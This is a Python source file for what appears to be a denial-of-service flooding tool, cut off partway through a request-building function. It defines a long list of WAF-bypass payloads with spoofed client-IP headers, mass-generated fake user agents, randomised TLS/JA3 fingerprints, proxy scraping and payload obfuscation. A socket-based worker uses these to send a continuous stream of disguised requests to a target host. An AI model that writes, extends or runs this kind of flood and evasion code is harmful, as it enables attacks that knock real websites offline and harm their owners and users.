import ssl
import random
import string
import time
import os
import sys
import logging
import multiprocessing
import socket
import struct
import hashlib
import psutil
import requests
import httpcore
from urllib.parse import urlparse, quote
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.live import Live
from rich.progress import Progress, BarColumn, TextColumn
from colorama import Fore, Style, init
import json
import base64
import zlib
import secrets
from itertools import product
import threading
import binascii
from multiprocessing import Manager
import urllib.parse

# Initialize colorama
init(autoreset=True)

# Initialize rich console
console = Console()

# Configure logging with verbose debugging
logging.basicConfig(
    level=logging.DEBUG,
    format=f"{Fore.RED}%(asctime)s{Style.RESET_ALL} [{Fore.WHITE}%(levelname)s{Style.RESET_ALL}] %(message)s",
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

# Constants (merged and expanded from both scripts)
CIPHERS = [
    "TLS_AES_128_GCM_SHA256", "TLS_AES_256_GCM_SHA384", "TLS_CHACHA20_POLY1305_SHA256",
    "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256", "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
    "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384", "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
    "TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256", "TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256",
    "TLS_RSA_WITH_AES_128_GCM_SHA256", "TLS_RSA_WITH_AES_256_GCM_SHA384",
    "TLS_AES_128_CCM_SHA256", "TLS_AES_128_CCM_8_SHA256",
    "TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA", "TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA",
    "TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA", "TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA",
    "TLS_RSA_WITH_AES_128_CBC_SHA", "TLS_RSA_WITH_AES_256_CBC_SHA",
    "TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256", "TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256",
    "TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA384", "TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384"
]
SIGNATURE_ALGORITHMS = [
    "ecdsa_secp256r1_sha256", "rsa_pss_rsae_sha256", "rsa_pkcs1_sha256",
    "ecdsa_secp384r1_sha384", "rsa_pss_rsae_sha384", "rsa_pkcs1_sha384",
    "rsa_pss_rsae_sha512", "rsa_pkcs1_sha512", "ecdsa_secp521r1_sha512",
    "ed25519", "ed448"
]
ECDH_CURVES = ["X25519", "secp256r1", "secp384r1", "secp521r1", "X448"]
ALPN_PROTOCOLS = ["h2", "http/1.1", "h3", "http/1.0", "spdy/3.1"]
COMPRESSION_ALGORITHMS = ["gzip", "deflate", "br", "zstd", "identity"]
HTTP_METHODS = ["GET", "POST", "HEAD", "OPTIONS", "TRACE", "PUT", "DELETE", "PATCH"]
DNS_RESOLVERS = ["8.8.8.8", "1.1.1.1", "9.9.9.9", "208.67.222.222", "8.8.4.4", "94.140.14.14"]
GEO_LOCATIONS = [
    {"lang": "en-US,en;q=0.9", "ip_prefix": "192.168.", "region": "US"},
    {"lang": "de-DE,de;q=0.9", "ip_prefix": "172.16.", "region": "DE"},
    {"lang": "fr-FR,fr;q=0.9", "ip_prefix": "10.0.", "region": "FR"},
    {"lang": "es-ES,es;q=0.9", "ip_prefix": "192.0.", "region": "ES"},
    {"lang": "ja-JP,ja;q=0.9", "ip_prefix": "172.20.", "region": "JP"},
    {"lang": "zh-CN,zh;q=0.9", "ip_prefix": "172.30.", "region": "CN"},
    {"lang": "ru-RU,ru;q=0.9", "ip_prefix": "10.10.", "region": "RU"},
    {"lang": "pt-BR,pt;q=0.9", "ip_prefix": "192.10.", "region": "BR"},
    {"lang": "ar-SA,ar;q=0.9", "ip_prefix": "172.25.", "region": "SA"}
]
SECURE_OPTIONS = (
    ssl.OP_NO_COMPRESSION | ssl.OP_CIPHER_SERVER_PREFERENCE |
    ssl.OP_SINGLE_DH_USE | ssl.OP_SINGLE_ECDH_USE
)
MAX_RAM_PERCENTAGE = 95
MAX_CPU_PERCENTAGE = 90
MAX_RETRIES = 5
RESTART_DELAY = 1
BROWSERS = [
    "chrome", "safari", "brave", "firefox", "mobile", "opera", "operagx",
    "duckduckgo", "edge", "vivaldi", "ucbrowser", "samsunginternet", "tor", "yandex"
]
WAF_BYPASS_PAYLOADS = [
    {"path": "/?rand={}", "headers": {"X-Forwarded-For": "{}.{}.{}.{}", "X-Real-IP": "{}.{}.{}.{}", "X-Client-IP": "{}.{}.{}.{}", "X-Proxy-ID": "{}"}},
    {"path": "/index.html?q={}", "headers": {"Referer": "https://www.google.com/", "X-Requested-With": "XMLHttpRequest", "X-Session-Token": "{}"}},
    {"path": "/api/{}", "headers": {"Accept": "application/json", "X-API-Token": "{}", "X-API-Version": "1.0"}},
    {"path": "/?query={}&id={}", "headers": {"X-Client-IP": "{}.{}.{}.{}", "X-Forwarded-Port": "{}", "X-Request-ID": "{}"}},
    {"path": "/search?q={}", "headers": {"DNT": "1", "X-Do-Not-Track": "1", "X-Privacy": "enabled", "X-Track-ID": "{}"}},
    {"path": "/?token={}", "headers": {"Authorization": "Bearer {}", "X-Auth-Token": "{}", "X-Auth-ID": "{}"}},
    {"path": "/assets/{}", "headers": {"Accept": "image/webp,*/*", "X-Asset-Type": "image", "X-Image-ID": "{}"}},
    {"path": "/?v={}&session={}", "headers": {"Connection": "keep-alive", "X-Session-ID": "{}", "X-Session-Key": "{}"}},
    {"path": "/{}/index.php", "headers": {"X-Forwarded-Host": "{}", "X-Host": "{}", "X-Host-ID": "{}"}},
    {"path": "/blog/{}", "headers": {"Accept-Language": "en-US,en;q=0.9,es;q=0.8", "X-Locale": "{}", "X-Region-ID": "{}"}},
    {"path": "/?key={}", "headers": {"X-Custom-Header": "{}", "X-Request-ID": "{}", "X-Trace-ID": "{}"}},
    {"path": "/api/v1/{}", "headers": {"Accept": "application/json", "X-API-Version": "1.0", "X-API-Token": "{}"}},
    {"path": "/?q={}&t={}", "headers": {"X-Requested-With": "XMLHttpRequest", "X-App-ID": "{}", "X-App-Token": "{}"}},
    {"path": "/{}/{}", "headers": {"Referer": "https://www.google.com/", "X-Origin": "{}", "X-Source-ID": "{}"}},
    {"path": "/?{}", "headers": {"Accept-Encoding": "gzip, deflate, br, zstd", "X-Compression": "{}"}},
    {"path": "/graphql", "headers": {"Content-Type": "application/json", "X-GraphQL-Query": "{\"query\": \"query { ping }\"}", "X-GraphQL-ID": "{}"}},
    {"path": "/?ping={}", "headers": {"X-Ping-Back": "{}", "X-Health-Check": "true", "X-Health-ID": "{}"}},
    {"path": "/{}/health", "headers": {"X-Health-Status": "{}", "X-Status-Check": "up", "X-Status-ID": "{}"}},
    {"path": "/?track={}", "headers": {"X-Tracking-ID": "{}", "X-Track-Session": "{}", "X-Track-ID": "{}"}},
    {"path": "/{}/metrics", "headers": {"X-Metrics-Token": "{}", "X-Stats-ID": "{}", "X-Metrics-ID": "{}"}},
    {"path": "/?event={}", "headers": {"X-Event-ID": "{}", "X-Event-Token": "{}", "X-Event-Check": "{}"}},
    {"path": "/{}/status", "headers": {"X-Status-Token": "{}", "X-Check-Status": "{}", "X-Status-Check": "{}"}},
    {"path": "/?callback={}&data={}", "headers": {"X-Callback-ID": "{}", "X-Data-ID": "{}", "X-Data-Token": "{}"}},
    {"path": "/api/v4/{}", "headers": {"X-API-Token": "{}", "X-Client-API": "{}", "X-API-ID": "{}"}},
    {"path": "/?session={}&key={}", "headers": {"X-Session-Track": "{}", "X-Key-ID": "{}", "X-Key-Token": "{}"}},
    {"path": "/{}/resource/v2", "headers": {"X-Resource-ID": "{}", "X-Resource-Token": "{}", "X-Resource-Check": "{}"}},
    {"path": "/?data={}&token={}", "headers": {"X-Data-Token": "{}", "X-Token-Check": "{}", "X-Token-ID": "{}"}},
    {"path": "/{}/content/v2", "headers": {"X-Content-ID": "{}", "X-Content-Token": "{}", "X-Content-Check": "{}"}},
    {"path": "/?query={}&id={}", "headers": {"X-Query-ID": "{}", "X-ID-Token": "{}", "X-ID-Check": "{}"}},
    {"path": "/{}/data/v3", "headers": {"X-Data-Source": "{}", "X-Source-ID": "{}", "X-Source-Token": "{}"}},
    {"path": "/?param={}&value={}", "headers": {"X-Param-ID": "{}", "X-Value-ID": "{}", "X-Value-Token": "{}"}},
    {"path": "/{}/api/v5", "headers": {"X-API-Version": "5.0", "X-Version-ID": "{}", "X-Version-Token": "{}"}},
    {"path": "/?key={}&session={}", "headers": {"X-Key-Token": "{}", "X-Session-Check": "{}", "X-Session-ID": "{}"}},
    {"path": "/{}/endpoint/v2", "headers": {"X-Endpoint-ID": "{}", "X-Endpoint-Token": "{}", "X-Endpoint-Check": "{}"}},
    {"path": "/?data={}&callback={}", "headers": {"X-Callback-Token": "{}", "X-Data-Check": "{}", "X-Data-ID": "{}"}},
    {"path": "/{}/resource/v3", "headers": {"X-Resource-Version": "3.0", "X-Resource-Check": "{}", "X-Resource-ID": "{}"}},
    {"path": "/?id={}&callback={}", "headers": {"X-ID-Check": "{}", "X-Callback-ID": "{}", "X-Callback-Token": "{}"}},
    {"path": "/{}/data/v4", "headers": {"X-Data-Version": "4.0", "X-Data-Check": "{}", "X-Data-ID": "{}"}},
    {"path": "/?session={}&param={}", "headers": {"X-Session-Version": "{}", "X-Param-ID": "{}", "X-Param-Token": "{}"}},
    {"path": "/{}/content/v4", "headers": {"X-Content-Version": "4.0", "X-Content-Check": "{}", "X-Content-ID": "{}"}},
    {"path": "/?query={}&data={}", "headers": {"X-Query-Check": "{}", "X-Data-Token": "{}", "X-Data-ID": "{}"}},
    {"path": "/{}/api/v6", "headers": {"X-API-Check": "{}", "X-API-ID": "{}", "X-API-Token": "{}"}},
    {"path": "/?key={}&token={}", "headers": {"X-Key-ID": "{}", "X-Token-ID": "{}", "X-Token-Check": "{}"}},
    {"path": "/{}/resource/v4", "headers": {"X-Resource-Version": "4.0", "X-Resource-Check": "{}", "X-Resource-ID": "{}"}},
    {"path": "/?id={}&callback={}", "headers": {"X-ID-Check": "{}", "X-Callback-ID": "{}", "X-Callback-Token": "{}"}},
    {"path": "/{}/data/v5", "headers": {"X-Data-Version": "5.0", "X-Data-Check": "{}", "X-Data-ID": "{}"}},
    {"path": "/?session={}&param={}", "headers": {"X-Session-ID": "{}", "X-Param-ID": "{}", "X-Param-Check": "{}"}},
    {"path": "/{}/content/v5", "headers": {"X-Content-Version": "5.0", "X-Content-Check": "{}", "X-Content-ID": "{}"}},
    {"path": "/?query={}&data={}", "headers": {"X-Query-ID": "{}", "X-Data-ID": "{}", "X-Data-Check": "{}"}},
    {"path": "/{}/api/v7", "headers": {"X-API-ID": "{}", "X-API-Check": "{}", "X-API-Token": "{}"}},
    {"path": "/?key={}&token={}", "headers": {"X-Key-ID": "{}", "X-Token-ID": "{}", "X-Token-Check": "{}"}},
    {"path": "/{}/resource/v5", "headers": {"X-Resource-ID": "{}", "X-Resource-Version": "5.0", "X-Resource-Check": "{}"}},
    {"path": "/?callback={}&session={}", "headers": {"X-Callback-ID": "{}", "X-Session-ID": "{}", "X-Session-Token": "{}"}},
    {"path": "/{}/endpoint/v3", "headers": {"X-Endpoint-ID": "{}", "X-Endpoint-Check": "{}", "X-Endpoint-Token": "{}"}},
    {"path": "/?data={}&query={}", "headers": {"X-Data-ID": "{}", "X-Query-ID": "{}", "X-Query-Token": "{}"}},
    {"path": "/{}/api/v8", "headers": {"X-API-ID": "{}", "X-API-Check": "{}", "X-API-Token": "{}"}},
    {"path": "/?key={}&value={}", "headers": {"X-Key-ID": "{}", "X-Value-ID": "{}", "X-Value-Token": "{}"}},
    {"path": "/{}/resource/v6", "headers": {"X-Resource-ID": "{}", "X-Resource-Version": "6.0", "X-Resource-Check": "{}"}},
    {"path": "/?id={}&callback={}", "headers": {"X-ID-Check": "{}", "X-Callback-ID": "{}", "X-Callback-Token": "{}"}},
    {"path": "/{}/data/v6", "headers": {"X-Data-Version": "6.0", "X-Data-Check": "{}", "X-Data-ID": "{}"}},
    {"path": "/?session={}&param={}", "headers": {"X-Session-ID": "{}", "X-Param-ID": "{}", "X-Param-Check": "{}"}},
    {"path": "/{}/content/v6", "headers": {"X-Content-Version": "6.0", "X-Content-Check": "{}", "X-Content-ID": "{}"}},
    {"path": "/?query={}&data={}", "headers": {"X-Query-ID": "{}", "X-Data-ID": "{}", "X-Data-Check": "{}"}},
    {"path": "/{}/api/v9", "headers": {"X-API-ID": "{}", "X-API-Check": "{}", "X-API-Token": "{}"}},
    {"path": "/?key={}&token={}", "headers": {"X-Key-ID": "{}", "X-Token-ID": "{}", "X-Token-Check": "{}"}},
    {"path": "/{}/resource/v7", "headers": {"X-Resource-ID": "{}", "X-Resource-Version": "7.0", "X-Resource-Check": "{}"}},
    {"path": "/?id={}&callback={}", "headers": {"X-ID-Check": "{}", "X-Callback-ID": "{}", "X-Callback-Token": "{}"}},
    {"path": "/{}/data/v7", "headers": {"X-Data-Version": "7.0", "X-Data-Check": "{}", "X-Data-ID": "{}"}},
    {"path": "/?session={}&param={}", "headers": {"X-Session-ID": "{}", "X-Param-ID": "{}", "X-Param-Check": "{}"}},
    {"path": "/{}/content/v7", "headers": {"X-Content-Version": "7.0", "X-Content-Check": "{}", "X-Content-ID": "{}"}},
    {"path": "/?query={}&data={}", "headers": {"X-Query-ID": "{}", "X-Data-ID": "{}", "X-Data-Check": "{}"}},
    {"path": "/{}/api/v10", "headers": {"X-API-ID": "{}", "X-API-Check": "{}", "X-API-Token": "{}"}},
    {"path": "/?key={}&token={}", "headers": {"X-Key-ID": "{}", "X-Token-ID": "{}", "X-Token-Check": "{}"}},
    {"path": "/{}/resource/v8", "headers": {"X-Resource-ID": "{}", "X-Resource-Version": "8.0", "X-Resource-Check": "{}"}},
    {"path": "/?id={}&callback={}", "headers": {"X-ID-Check": "{}", "X-Callback-ID": "{}", "X-Callback-Token": "{}"}},
    {"path": "/{}/data/v8", "headers": {"X-Data-Version": "8.0", "X-Data-Check": "{}", "X-Data-ID": "{}"}},
    {"path": "/?session={}&param={}", "headers": {"X-Session-ID": "{}", "X-Param-ID": "{}", "X-Param-Check": "{}"}},
    {"path": "/{}/content/v8", "headers": {"X-Content-Version": "8.0", "X-Content-Check": "{}", "X-Content-ID": "{}"}},
    {"path": "/?query={}&data={}", "headers": {"X-Query-ID": "{}", "X-Data-ID": "{}", "X-Data-Check": "{}"}},
    {"path": "/{}/api/v11", "headers": {"X-API-ID": "{}", "X-API-Check": "{}", "X-API-Token": "{}"}},
    {"path": "/?key={}&token={}", "headers": {"X-Key-ID": "{}", "X-Token-ID": "{}", "X-Token-Check": "{}"}},
    {"path": "/{}/resource/v9", "headers": {"X-Resource-ID": "{}", "X-Resource-Version": "9.0", "X-Resource-Check": "{}"}},
    {"path": "/?id={}&callback={}", "headers": {"X-ID-Check": "{}", "X-Callback-ID": "{}", "X-Callback-Token": "{}"}},
    {"path": "/{}/data/v9", "headers": {"X-Data-Version": "9.0", "X-Data-Check": "{}", "X-Data-ID": "{}"}},
    {"path": "/?session={}&param={}", "headers": {"X-Session-ID": "{}", "X-Param-ID": "{}", "X-Param-Check": "{}"}},
    {"path": "/{}/content/v9", "headers": {"X-Content-Version": "9.0", "X-Content-Check": "{}", "X-Content-ID": "{}"}},
    {"path": "/?query={}&data={}", "headers": {"X-Query-ID": "{}", "X-Data-ID": "{}", "X-Data-Check": "{}"}},
    {"path": "/{}/api/v12", "headers": {"X-API-ID": "{}", "X-API-Check": "{}", "X-API-Token": "{}"}},
    {"path": "/?key={}&token={}", "headers": {"X-Key-ID": "{}", "X-Token-ID": "{}", "X-Token-Check": "{}"}},
    {"path": "/{}/resource/v10", "headers": {"X-Resource-ID": "{}", "X-Resource-Version": "10.0", "X-Resource-Check": "{}"}},
    {"path": "/?id={}&callback={}", "headers": {"X-ID-Check": "{}", "X-Callback-ID": "{}", "X-Callback-Token": "{}"}},
    {"path": "/{}/data/v10", "headers": {"X-Data-Version": "10.0", "X-Data-Check": "{}", "X-Data-ID": "{}"}},
    {"path": "/?session={}&param={}", "headers": {"X-Session-ID": "{}", "X-Param-ID": "{}", "X-Param-Check": "{}"}},
    {"path": "/{}/content/v10", "headers": {"X-Content-Version": "10.0", "X-Content-Check": "{}", "X-Content-ID": "{}"}},
    {"path": "/?query={}&data={}", "headers": {"X-Query-ID": "{}", "X-Data-ID": "{}", "X-Data-Check": "{}"}},
    {"path": "/{}/api/v13", "headers": {"X-API-ID": "{}", "X-API-Check": "{}", "X-API-Token": "{}"}},
    {"path": "/?key={}&token={}", "headers": {"X-Key-ID": "{}", "X-Token-ID": "{}", "X-Token-Check": "{}"}},
    {"path": "/{}/resource/v11", "headers": {"X-Resource-ID": "{}", "X-Resource-Version": "11.0", "X-Resource-Check": "{}"}},
    {"path": "/?id={}&callback={}", "headers": {"X-ID-Check": "{}", "X-Callback-ID": "{}", "X-Callback-Token": "{}"}},
    {"path": "/{}/data/v11", "headers": {"X-Data-Version": "11.0", "X-Data-Check": "{}", "X-Data-ID": "{}"}},
    {"path": "/?session={}&param={}", "headers": {"X-Session-ID": "{}", "X-Param-ID": "{}", "X-Param-Check": "{}"}},
    {"path": "/{}/content/v11", "headers": {"X-Content-Version": "11.0", "X-Content-Check": "{}", "X-Content-ID": "{}"}},
    {"path": "/?query={}&data={}", "headers": {"X-Query-ID": "{}", "X-Data-ID": "{}", "X-Data-Check": "{}"}},
    {"path": "/{}/api/v14", "headers": {"X-API-ID": "{}", "X-API-Check": "{}", "X-API-Token": "{}"}},
    {"path": "/?key={}&token={}", "headers": {"X-Key-ID": "{}", "X-Token-ID": "{}", "X-Token-Check": "{}"}}
]

# Randomization Functions
def random_int(min_, max_):
    return random.randint(min_, max_)

def random_element(elements):
    return random.choice(elements)

def random_string(length):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def generate_random_string(min_length, max_length):
    length = random.randint(min_length, max_length)
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def generate_random_ip():
    return f"{random_int(1, 255)}.{random_int(1, 255)}.{random_int(1, 255)}.{random_int(1, 255)}"

# TLS Fingerprints
TLS_FINGERPRINTS = [
    {
        "cipher": c,
        "curve": random_element(ECDH_CURVES),
        "version": v,
        "bits": b,
        "extensions": random.sample(["sni", "ticket", "alpn", "padding", "status_request", "key_share", "grease"], random_int(3, 7)),
        "ja3": f"{random_int(769, 771)},{random_int(4865, 4867)}-{random_int(0, 65535)},{random_int(0, 255)}-{random_int(10, 13)}-{random_int(23, 25)},{random_int(0, 5)}"
    }
    for c, v, b in product(CIPHERS, ["TLSv1.2", "TLSv1.3"], [128, 256])
] + [
    {"cipher": "TLS_AES_128_GCM_SHA256", "curve": "X25519", "version": "TLSv1.3", "bits": 128, "extensions": ["sni", "ticket", "key_share", "grease"], "ja3": "771,4865,0-11-10-13,23-24-25,0"},
    {"cipher": "TLS_AES_256_GCM_SHA384", "curve": "secp256r1", "version": "TLSv1.3", "bits": 256, "extensions": ["alpn", "ticket", "padding", "status_request"], "ja3": "771,4866,10-11-13-23,24-25,0"},
    {"cipher": "TLS_CHACHA20_POLY1305_SHA256", "curve": "X448", "version": "TLSv1.3", "bits": 256, "extensions": ["sni", "alpn", "key_share", "grease"], "ja3": "771,4867,13-10-11,25-24-23,0"},
    {"cipher": "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256", "curve": "secp384r1", "version": "TLSv1.2", "bits": 128, "extensions": ["ticket", "padding", "status_request"], "ja3": "769,4865,10-11,23-24,0"},
    {"cipher": "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256", "curve": "secp521r1", "version": "TLSv1.2", "bits": 128, "extensions": ["sni", "key_share", "grease"], "ja3": "769,4865,11-10,24-23,0"}
]

# Generate User-Agents
def generate_user_agents(count=25000):
    platforms = [
        "Windows NT 10.0; Win64; x64", "Windows NT 6.1; Win64; x64",
        "Macintosh; Intel Mac OS X 10_{}_{}", "Linux; Android {}", "X11; Linux x86_64",
        "iPhone; CPU iPhone OS {} like Mac OS X", "iPad; CPU OS {} like Mac OS X",
        "Windows NT 11.0; Win64; x64", "Macintosh; Apple M1 Mac OS X 12_{}_{}",
        "Linux; Ubuntu 20.04", "Android 13; SM-G998B Build/TP1A.220624.014",
        "Windows NT 10.0; ARM64", "Macintosh; Intel Mac OS X 13_{}_{}"
    ]
    browsers = [
        ("Chrome", 115, 124), ("Firefox", 99, 112), ("Safari", 14, 16), ("Edge", 115, 124),
        ("Opera", 90, 99), ("Brave", 115, 124), ("Vivaldi", 6, 8), ("DuckDuckGo", 12, 16),
        ("UCBrowser", 12, 15), ("SamsungInternet", 16, 20), ("Tor", 10, 12), ("Yandex", 20, 24)
    ]
    extensions = ["AdBlock", "uBlock Origin", "Privacy Badger", "Ghostery", "NoScript", ""]
    user_agents = []
    for _ in range(count):
        platform = random_element(platforms)
        browser, min_ver, max_ver = random_element(browsers)
        version = random_int(min_ver, max_ver)
        ext = random_element(extensions)
        if platform.startswith("Macintosh"):
            platform = platform.format(random_int(12, 15), random_int(0, 4))
        elif platform.startswith("Linux; Android"):
            platform = platform.format(random_int(10, 13))
        elif platform.startswith("iPhone") or platform.startswith("iPad"):
            platform = platform.format(f"{random_int(12, 16)}_0_{random_int(0, 4)}")
        if browser == "Chrome":
            ua = f"Mozilla/5.0 ({platform}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version}.0.{random_int(0, 5000)}.0 Safari/537.36{'' if not ext else f' {ext}'}"
        elif browser == "Firefox":
            ua = f"Mozilla/5.0 ({platform}; rv:{version}.0) Gecko/20100101 Firefox/{version}.0{'' if not ext else f' {ext}'}"
        elif browser == "Safari":
            ua = f"Mozilla/5.0 ({platform}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{version}.0 Safari/605.1.15{'' if not ext else f' {ext}'}"
        elif browser == "Edge":
            ua = f"Mozilla/5.0 ({platform}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version}.0.{random_int(0, 5000)}.0 Safari/537.36 Edge/{version}.0{'' if not ext else f' {ext}'}"
        elif browser == "Opera":
            ua = f"Mozilla/5.0 ({platform}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version}.0.{random_int(0, 5000)}.0 Safari/537.36 OPR/{random_int(80, 89)}.0.0.0{'' if not ext else f' {ext}'}"
        elif browser == "Brave":
            ua = f"Mozilla/5.0 ({platform}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version}.0.{random_int(0, 5000)}.0 Safari/537.36 Brave/{random_int(1, 4)}.{random_int(0, 9)}.{random_int(0, 499)}{'' if not ext else f' {ext}'}"
        elif browser == "Vivaldi":
            ua = f"Mozilla/5.0 ({platform}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version}.0.{random_int(0, 5000)}.0 Safari/537.36 Vivaldi/{random_int(5, 8)}.0{'' if not ext else f' {ext}'}"
        elif browser == "DuckDuckGo":
            ua = f"Mozilla/5.0 ({platform}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version}.0.{random_int(0, 5000)}.0 Safari/537.36 DuckDuckGo/{random_int(10, 15)}.0{'' if not ext else f' {ext}'}"
        elif browser == "UCBrowser":
            ua = f"Mozilla/5.0 ({platform}) UCBrowser/{random_int(12, 15)}.0.{random_int(0, 9)}{'' if not ext else f' {ext}'}"
        elif browser == "SamsungInternet":
            ua = f"Mozilla/5.0 ({platform}) AppleWebKit/537.36 (KHTML, like Gecko) SamsungInternet/{random_int(16, 20)}.0 Chrome/{version}.0.{random_int(0, 5000)}.0 Safari/537.36{'' if not ext else f' {ext}'}"
        elif browser == "Tor":
            ua = f"Mozilla/5.0 ({platform}) Tor/{random_int(10, 12)}.0.{random_int(0, 9)} (Tor Browser){'' if not ext else f' {ext}'}"
        elif browser == "Yandex":
            ua = f"Mozilla/5.0 ({platform}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version}.0.{random_int(0, 5000)}.0 YaBrowser/{random_int(20, 24)}.0.0 Safari/537.36{'' if not ext else f' {ext}'}"
        user_agents.append(ua)
    return user_agents

USER_AGENTS = generate_user_agents()

# Helper Functions
def shuffle_headers(headers):
    keys = list(headers.keys())
    random.shuffle(keys)
    return {k: headers[k] for k in keys}

def randomize_header_case(headers):
    return {random.choice([k.title(), k.lower(), k.upper()]): v for k, v in headers.items()}

def manual_header_encode(headers):
    return "\r\n".join(f"{k}: {v}" for k, v in headers.items())

def obfuscate_payload(payload):
    encoding = random.choice(["base64", "hex", "zlib", "url"])
    try:
        if encoding == "base64":
            return base64.b64encode(payload.encode()).decode()
        elif encoding == "hex":
            return binascii.hexlify(payload.encode()).decode()
        elif encoding == "zlib":
            return base64.b64encode(zlib.compress(payload.encode())).decode()
        elif encoding == "url":
            return urllib.parse.quote(payload)
    except Exception as e:
        logger.error(f"Payload obfuscation error: {str(e)}")
        return payload
    return payload

def encode_frame(stream_id, frame_type, payload, flags=0):
    length = len(payload)
    header = struct.pack(">BBH", (length >> 16) & 0xFF, (length >> 8) & 0xFF, length & 0xFF) + bytes([frame_type]) + bytes([flags]) + struct.pack(">I", stream_id)[1:]
    return header + payload

def encode_settings(settings):
    payload = b""
    for identifier, value in settings:
        payload += struct.pack(">H", identifier) + struct.pack(">I", value)
    return payload

def generate_fake_cookie():
    return f"session_{generate_random_string(10, 20)}={generate_random_string(20, 40)}; auth_{generate_random_string(5, 15)}={secrets.token_hex(16)}; user_{generate_random_string(5, 10)}={secrets.token_hex(16)}"

def fetch_proxies():
    try:
        response = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all", timeout=5)
        proxies = response.text.splitlines()
        return [{"http": f"http://{proxy}", "https": f"http://{proxy}"} for proxy in proxies if proxy]
    except Exception as e:
        logger.warning(f"Failed to fetch proxies: {str(e)}")
        return []

def resolve_dns(domain):
    for resolver in DNS_RESOLVERS:
        try:
            socket.setdefaulttimeout(2)
            ip = socket.getaddrinfo(domain, 443, socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)[0][4][0]
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((ip, 443))
            sock.close()
            if result == 0:
                logger.debug(f"DNS resolved {domain} to {ip}")
                return ip
        except Exception as e:
            logger.debug(f"DNS resolution failed with resolver {resolver} for {domain}: {str(e)}")
    logger.warning(f"All DNS resolvers failed for {domain}, using fallback IP 127.0.0.1")
    return "127.0.0.1"

def monitor_resources(stats, stop_event):
    while not stop_event.is_set():
        try:
            ram_usage = psutil.virtual_memory().percent
            cpu_usage = psutil.cpu_percent(interval=1)
            if ram_usage > MAX_RAM_PERCENTAGE or cpu_usage > MAX_CPU_PERCENTAGE:
                logger.warning(f"High resource usage - RAM: {ram_usage}%, CPU: {cpu_usage}%. Shutting down...")
                stop_event.set()
        except Exception as e:
            logger.error(f"Resource monitor error: {str(e)}")
        time.sleep(5)

# TLS Worker (Socket-Based)
def tls_worker(target_url, stats, stop_event, rate_limit, port):
    session_cookies = {}
    retry_count = 0
    while not stop_event.is_set():
        try:
            geo = random_element(GEO_LOCATIONS)
            tls_fingerprint = random_element(TLS_FINGERPRINTS)
            user_agent = random_element(USER_AGENTS)
            method = random_element(HTTP_METHODS)
            alpn = random_element(ALPN_PROTOCOLS)
            compression = random_element(COMPRESSION_ALGORITHMS)
            payload = generate_random_string(10, 50)
            obfuscated_payload = obfuscate_payload(payload)
            waf_payload = random_element(WAF_BYPASS_PAYLOADS)
            path = waf_payload["path"].format(generate_random_string(5, 15), generate_random_string(5, 15))
            path = urllib.parse.quote(path) if random.choice([True, False]) else path
            headers = waf_payload["headers"].copy()
            for k in headers:
                headers[k] = headers[k].format(generate_random_ip(), generate_random_string(5, 15))
            headers.update({
                "User-Agent": user_agent,
                "Accept-Language": geo["lang"],
                "Accept-Encoding": compression,
                "X-Forwarded-For": generate_random_ip(),
                "Cookie": generate_fake_cookie() + (f"; {session_cookies.get('session', '')}" if session_cookies.get('session') else ""),
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "X-JA3-Fingerprint": tls_fingerprint["ja3"],
                "X-TLS-Session-Ticket": secrets.token_hex(16)
            })
            headers = shuffle_headers(randomize_header_case(headers))

            target_ip = resolve_dns(urlparse(target_url).hostname)
            if target_ip == "127.0.0.1":
                logger.warning("Invalid IP, skipping request")
                with stats.get_lock():
                    stats["detection_events"] += 1
                time.sleep(1)
                continue

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            context.minimum_version = ssl.TLSVersion.TLSv1_2 if tls_fingerprint["version"] == "TLSv1.2" else ssl.TLSVersion.TLSv1_3
            context.set_ciphers(tls_fingerprint["cipher"])
            context.set_ecdh_curve(tls_fingerprint["curve"])
            context.options |= SECURE_OPTIONS
            context.set_alpn_protocols([alpn])
            sock = context.wrap_socket(sock, server_hostname=urlparse(target_url).hostname)

            start_time = time.time()
            for attempt in range(MAX_RETRIES):
                try:
                    sock.connect((target_ip, port))
                    logger.debug(f"TLS connected to {target_ip}:{port}")
                    break
                except Exception as e:
                    logger.debug(f"TLS connection attempt {attempt + 1} failed: {str(e)}")
                    if attempt == MAX_RETRIES - 1:
                        raise
                    time.sleep(2 ** attempt)

            request = (
                f"{method} {path} HTTP/1.1\r\n"
                f"Host: {urlparse(target_url).hostname}\r\n"
                f"{manual_header_encode(headers)}\r\n\r\n"
                f"{obfuscated_payload}"
